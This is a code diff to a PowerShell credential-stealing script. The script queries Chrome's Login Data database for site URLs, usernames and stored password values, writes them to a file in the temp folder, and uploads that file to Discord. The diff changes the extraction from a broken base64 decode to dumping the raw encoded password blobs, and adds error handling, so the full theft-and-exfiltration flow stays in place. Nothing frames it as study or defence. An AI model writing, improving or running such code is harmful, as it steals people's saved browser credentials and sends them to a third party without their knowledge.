@@ -18,45 +18,46 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to extract passwords from Chrome Login Data (SQLite database)
-function Extract-Passwords {
+# Function to extract passwords (encoded) from Chrome Login Data
+function Extract-EncodedPasswords {
     param (
         [string]$chromeLoginDataPath,
         [string]$outputFilePath
     )
 
-    # Ensure the SQLite module is available
-    if (-not (Get-Command 'sqlite3' -ErrorAction SilentlyContinue)) {
-        Write-Host "SQLite3 command is not available. Please install it."
+    # Check if the Login Data file exists
+    if (-not (Test-Path $chromeLoginDataPath)) {
+        Write-Host "Login Data file not found: $chromeLoginDataPath"
         return
     }
 
-    # Define the SQLite query to extract login data (usernames and passwords)
-    $query = "SELECT origin_url, action_url, username_value, password_value FROM logins;"
+    # Open the Login Data SQLite database
+    try {
+        # Use SQLite to extract the passwords
+        $query = "SELECT origin_url, username_value, password_value FROM logins;"
+        $cmd = "sqlite3 '$chromeLoginDataPath' '$query'"
+        $output = & $cmd
 
-    # Read the Login Data database using SQLite3 command-line tool
-    $cmd = "sqlite3 $chromeLoginDataPath '$query'"
-    $output = & $cmd
+        if ($output) {
+            # Write the raw encoded password data to a .txt file
+            $passwordsText = "Chrome Raw Encoded Passwords:`r`n"
+            foreach ($line in $output.Split("`r`n")) {
+                if ($line -match "(.+)\|(.+)\|(.+)") {
+                    $url = $matches[1]
+                    $username = $matches[2]
+                    $encodedPassword = $matches[3]  # This will be the raw encoded password
 
-    if ($output) {
-        # Convert the output into a clean format
-        $passwordsText = "Chrome Passwords Extracted:`r`n"
-        foreach ($line in $output.Split("`r`n")) {
-            if ($line -match "(.+)\|(.+)\|(.+)\|(.+)") {
-                $url = $matches[1]
-                $username = $matches[2]
-                $password = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[4]))
-
-                # Write the extracted data to the output file
-                $passwordsText += "URL: $url`r`nUsername: $username`r`nPassword: $password`r`n`r`n"
+                    # Write the extracted data to the output file
+                    $passwordsText += "URL: $url`r`nUsername: $username`r`nEncoded Password: $encodedPassword`r`n`r`n"
+                }
             }
-        }
 
-        # Save the passwords to a .txt file
-        $passwordsText | Out-File -FilePath $outputFilePath
-        Write-Host "Passwords saved to: $outputFilePath"
-    } else {
-        Write-Host "No passwords found or error extracting data."
+            # Save the encoded passwords to a .txt file
+            $passwordsText | Out-File -FilePath $outputFilePath
+            Write-Host "Encoded passwords saved to: $outputFilePath"
+        }
+    } catch {
+        Write-Host "Error extracting encoded passwords: $_"
     }
 }
 
@@ -105,10 +106,10 @@ if (-not (Test-Path $loginDataPath)) {
 # Define the output path for the password file
 $outputFile = "$env:TEMP\chrome_passwords.txt"
 
-# Extract passwords from Chrome's Login Data
-Extract-Passwords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile
+# Extract the raw encoded passwords from Chrome's Login Data
+Extract-EncodedPasswords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile
 
-# Upload the .txt file containing passwords to Discord
+# Upload the .txt file containing encoded passwords to Discord
 Upload-FileToDiscord -filePath $outputFile
 
 # Optionally, remove the .txt file after uploading
